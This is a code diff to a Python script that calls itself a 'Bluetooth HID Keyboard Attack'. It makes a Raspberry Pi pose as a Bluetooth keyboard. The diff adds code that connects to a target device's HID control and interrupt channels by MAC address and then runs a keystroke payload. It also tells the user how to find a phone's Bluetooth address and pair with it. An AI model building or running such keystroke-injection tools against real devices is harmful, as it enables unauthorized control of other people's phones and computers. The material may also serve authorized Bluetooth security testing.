@@ -93,6 +93,54 @@ class HIDKeyboard:
         
         print("[+] Both channels connected! Ready to send keystrokes.")
         
+    def connect_to_target(self, target_mac):
+        """Actively connect to target device"""
+        print("\n[*] Initiating connection to target...")
+        print(f"[*] Target: {target_mac}")
+        print("")
+        print("[!] IMPORTANT: The target device must:")
+        print("    1. Have Bluetooth enabled")
+        print("    2. Be discoverable (in Bluetooth settings)")
+        print("    3. Have previously paired with this Pi")
+        print("    OR be ready to accept pairing")
+        print("")
+        
+        try:
+            # Connect control channel
+            print("[*] Connecting control channel (PSM 17)...")
+            self.ctrl_client = BluetoothSocket(L2CAP)
+            self.ctrl_client.connect((target_mac, HID_CONTROL_PSM))
+            print(f"[+] Control channel connected!")
+            
+            # Small delay between channel connections
+            time.sleep(0.5)
+            
+            # Connect interrupt channel
+            print("[*] Connecting interrupt channel (PSM 19)...")
+            self.intr_client = BluetoothSocket(L2CAP)
+            self.intr_client.connect((target_mac, HID_INTERRUPT_PSM))
+            print(f"[+] Interrupt channel connected!")
+            
+            print("[+] Both channels connected! Ready to send keystrokes.")
+            
+        except bluetooth.btcommon.BluetoothError as e:
+            print(f"[!] Bluetooth connection failed: {e}")
+            print("")
+            print("Common causes:")
+            print("  1. Device not paired - pair first:")
+            print(f"     bluetoothctl")
+            print(f"     scan on")
+            print(f"     pair {target_mac}")
+            print(f"     trust {target_mac}")
+            print(f"     quit")
+            print("  2. Device not in range")
+            print("  3. Device Bluetooth is off")
+            print("  4. Device already connected to another device")
+            raise
+        except Exception as e:
+            print(f"[!] Connection error: {e}")
+            raise
+        
     def send_report(self, report):
         """Send HID report via interrupt channel"""
         if self.intr_client:
@@ -254,7 +302,28 @@ def setup_bluetooth_service():
 def main():
     if os.geteuid() != 0:
         print("[!] This script must be run as root!")
-        print("    Usage: sudo python3 bt_hid_simple.py")
+        print("    Usage: sudo python3 bt_hid_simple.py <target_mac_address>")
+        print("    Example: sudo python3 bt_hid_simple.py 18:68:6A:FA:10:43")
+        sys.exit(1)
+    
+    # Check for MAC address argument
+    if len(sys.argv) < 2:
+        print("[!] Missing target MAC address!")
+        print("    Usage: sudo python3 bt_hid_simple.py <target_mac_address>")
+        print("    Example: sudo python3 bt_hid_simple.py 18:68:6A:FA:10:43")
+        print("")
+        print("To find your phone's MAC address:")
+        print("  1. On Android: Settings > About Phone > Status > Bluetooth address")
+        print("  2. Or scan with: sudo hcitool scan")
+        sys.exit(1)
+    
+    target_mac = sys.argv[1]
+    
+    # Validate MAC address format
+    import re
+    if not re.match(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$', target_mac):
+        print(f"[!] Invalid MAC address format: {target_mac}")
+        print("    Expected format: XX:XX:XX:XX:XX:XX")
         sys.exit(1)
         
     # Check if pybluez is installed
@@ -269,6 +338,8 @@ def main():
     print("="*50)
     print("Bluetooth HID Keyboard Attack - Simple Version")
     print("="*50)
+    print(f"Target MAC: {target_mac}")
+    print("")
     
     # Setup SDP record
     setup_bluetooth_service()
@@ -280,8 +351,8 @@ def main():
         # Setup sockets
         kb.setup_sockets()
         
-        # Wait for connection
-        kb.wait_for_connection()
+        # Connect to target
+        kb.connect_to_target(target_mac)
         
         # Run payload
         kb.run_payload()
